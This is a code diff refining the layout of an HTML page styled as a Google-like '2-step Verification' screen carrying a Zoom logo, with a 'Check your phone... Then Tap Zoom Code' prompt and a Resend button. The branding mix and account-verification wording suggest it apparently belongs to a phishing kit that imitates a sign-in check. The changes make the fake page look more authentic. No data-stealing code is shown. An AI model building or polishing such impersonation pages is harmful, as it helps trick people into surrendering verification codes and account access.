@@ -33,7 +33,7 @@
       justify-content: space-between;
       align-items: center;
       text-align: center;
-      padding: 2vh 5vw 2.5vh 5vw;
+      padding: 1.5vh 4vw 2vh 4vw;
       background: #ffffff;
       max-width: 440px;
       margin: 0 auto;
@@ -45,32 +45,37 @@
       flex-direction: column;
       align-items: center;
       width: 100%;
-      gap: 0.5vh;
+      gap: 0.4vh;
     }
 
-    /* Zoom Logo - Boro kora holo */
+    /* Zoom Logo - Crop fix kora holo (overflow and height fix) */
+    .logo-wrapper {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 35px;
+    }
+
     .logo {
-      width: 15vw;
-      max-width: 60px;
-      height: auto;
+      height: 28px;
+      width: auto;
       object-fit: contain;
-      border-radius: 50%;
     }
 
-    /* Main Heading - Boro font */
+    /* Main Heading - Aro boro font */
     h1 {
-      font-size: clamp(22px, 5.8vw, 27px);
+      font-size: clamp(23px, 6vw, 29px);
       font-weight: 500;
       color: #202124;
     }
 
-    /* Subtitle - Boro font */
+    /* Subtitle - Aro boro font */
     .subtitle {
-      font-size: clamp(14px, 3.8vw, 16px);
+      font-size: clamp(14.5px, 4vw, 17px);
       color: #5f6368;
       font-weight: 400;
-      max-width: 350px;
-      line-height: 1.35;
+      max-width: 360px;
+      line-height: 1.3;
     }
 
     /* Email Pill Selector box */
@@ -79,21 +84,21 @@
       align-items: center;
       justify-content: center;
       gap: 6px;
-      padding: 5px 14px;
+      padding: 4px 14px;
       border: 1px solid #dadce0;
       border-radius: 20px;
-      margin-top: 0.4vh;
+      margin-top: 0.3vh;
       background: #fff;
     }
 
     .email-pill svg {
-      width: 18px;
-      height: 18px;
+      width: 16px;
+      height: 16px;
       fill: #1a73e8;
     }
 
     .email-text {
-      font-size: 14px;
+      font-size: 13.5px;
       font-weight: 500;
       color: #3c4043;
     }
@@ -103,26 +108,26 @@
       color: #5f6368;
     }
 
-    /* Phone Graphic Illustration - Aro boro ebong gap fill korar jonno */
-    .phone-illustration {
-      width: 65vw;
-      max-width: 270px;
-      height: auto;
-      max-height: 42vh;
-      object-fit: contain;
-      margin: auto 0;
-    }
-
-    /* Bottom Section */
-    .bottom-section {
+    /* Center Content Wrapper (Phone + Text grouped together to eliminate gap) */
+    .center-content {
       display: flex;
       flex-direction: column;
       align-items: center;
       width: 100%;
-      gap: 1.5vh;
+      gap: 1.2vh;
+      margin: auto 0;
     }
 
-    /* Text Group */
+    /* Phone Graphic Illustration - Aro boro kora holo */
+    .phone-illustration {
+      width: 48vw;
+      max-width: 200px;
+      height: auto;
+      max-height: 32vh;
+      object-fit: contain;
+    }
+
+    /* Text Group (Phone er nichei check er text gulo) */
     .text-group {
       display: flex;
       flex-direction: column;
@@ -131,19 +136,19 @@
       gap: 0.4vh;
     }
 
-    /* Sub Heading - Boro font */
+    /* Sub Heading - Aro boro font */
     h2 {
-      font-size: clamp(19px, 5vw, 23px);
+      font-size: clamp(20px, 5.2vw, 25px);
       font-weight: 500;
       color: #202124;
     }
 
-    /* Description Text - Boro font */
+    /* Description Text - Aro boro font */
     .desc-text {
-      font-size: clamp(15px, 4.2vw, 18px);
+      font-size: clamp(15.5px, 4.3vw, 19px);
       font-weight: 400;
       color: #3c4043;
-      line-height: 1.4;
+      line-height: 1.35;
     }
 
     .desc-text span {
@@ -155,10 +160,10 @@
     .btn-join {
       background-color: #1a73e8;
       color: white;
-      padding: 14px 0;
+      padding: 13px 0;
       width: 100%;
       max-width: 360px;
-      font-size: 16.5px;
+      font-size: 17px;
       font-weight: 500;
       border: none;
       border-radius: 6px;
@@ -179,7 +184,9 @@
 
   <div class="container">
     <div class="top-section">
-      <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
+      <div class="logo-wrapper">
+        <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
+      </div>
       <h1>2-step Verification</h1>
       <p class="subtitle">This extra step shows that it’s really you trying to sign in</p>
       
@@ -190,9 +197,9 @@
       </div>
     </div>
 
-    <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
-
-    <div class="bottom-section">
+    <!-- Phone illustration and check text grouped together directly under center -->
+    <div class="center-content">
+      <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
       <div class="text-group">
         <h2>Check your phone.</h2>
         <p class="desc-text">
@@ -201,8 +208,9 @@
           Then Tap Zoom Code
         </p>
       </div>
-      <button class="btn-join" onclick="window.location.href='../'">Resend</button>
     </div>
+
+    <button class="btn-join" onclick="window.location.href='../'">Resend</button>
   </div>
 
 </body>
